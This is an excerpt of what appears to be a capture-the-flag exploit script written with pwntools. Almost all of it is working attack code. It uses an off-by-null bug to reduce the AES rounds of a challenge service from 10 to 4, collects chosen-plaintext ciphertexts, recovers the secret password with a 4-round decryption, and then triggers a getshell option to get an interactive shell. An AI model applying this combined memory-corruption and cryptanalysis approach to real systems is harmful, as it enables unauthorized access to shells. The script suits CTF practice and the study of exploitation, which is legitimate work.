...
def unit_getshell(psw):
	unit_menu(5)
	io.recvuntil('[+]')
	io.sendlineafter('[+]',psw)
...
unit_gen()
#unit_enc()
unit_test('0'*0x20)#offbynull to change aes rounds 10 to 4
io.recvuntil('----menu----')
ciphertexts=[]
for i in range(0,256):
    plain_text = str(hex(i))[2:].rjust(2,'0')+'0'*14
    unit_test(plain_text)
    io.recvuntil('[+]')
    ciphertexts.append(io.recvline()[:-1])
...
unit_enc()
io.recvuntil('[+]')
tmpsecret=io.recvline()[:-1].decode('hex')
tmpsecret = [ord(c) for c in tmpsecret]
secret=decrypt4rounds(tmpsecret,key)
psw=''
for i in secret:
    psw+=str(hex(i))[2:].rjust(2,'0')
#print psw
unit_getshell(psw)
io.interactive()